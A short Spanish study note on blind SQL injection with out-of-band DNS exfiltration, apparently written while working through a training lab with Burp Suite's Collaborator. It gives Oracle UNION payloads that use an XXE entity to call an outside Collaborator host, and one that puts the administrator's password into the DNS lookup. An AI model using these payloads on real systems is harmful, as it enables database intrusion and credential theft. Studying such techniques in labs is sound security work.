- Tags : #sql #sqlinjection #sqlinjection_blind

Para este tipo de ataques se realizan consultas DNS a partir de la consulta SQL, utilizaremos el Burp Colaborator para obtener la información. Se necesita Burpsuit profesional.

Después de haber intentado todos los tipos de inyección anterior si no obtenemos ningún resultado intentaremos este tipo de ataque. Es importante destacar que los ataques de inyección de SQL son de prueba y error hasta lograr identificar la inyección que es efectiva.

Es importante destacar que hay caracteres que pueden entrar en conflicto con las query como pueden ser {; % & } estos se pueden urlencodear para que no generen problemas. Esto se hace en burpsuit con CTR+U quedando la consulta de la siguinete forma fijar en romete y despues de ENTITY

La url que pondremos en la cosulta es la del collaborator que es el que se encargara de obtener la informacion de las consultas dns
```
'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 

'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://fex3vn8psk0v3vtkkd7y4wupsgy7mxam.oastify.com/"> %25remote%3b]>'),'/l') FROM dual
```

Una vez logrado esto intentaremos extraer información mediante estas consultas DNS

Lo que se intenta en estos casos es concatenar una query en la peticción http para ver que nos devuelve en el collaborator los datos de la BD
```
'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||select password from users where username='administrator'||'.fex3vn8psk0v3vtkkd7y4wupsgy7mxam.oastify.com/"> %25remote%3b]>'),'/l') FROM dual
```

Si todo sale bien en el collaborator en la respuesta del dns nos ventra la passwor y asi cualquier dato que solicitemos


![[Pasted image 20251202110151.png]]

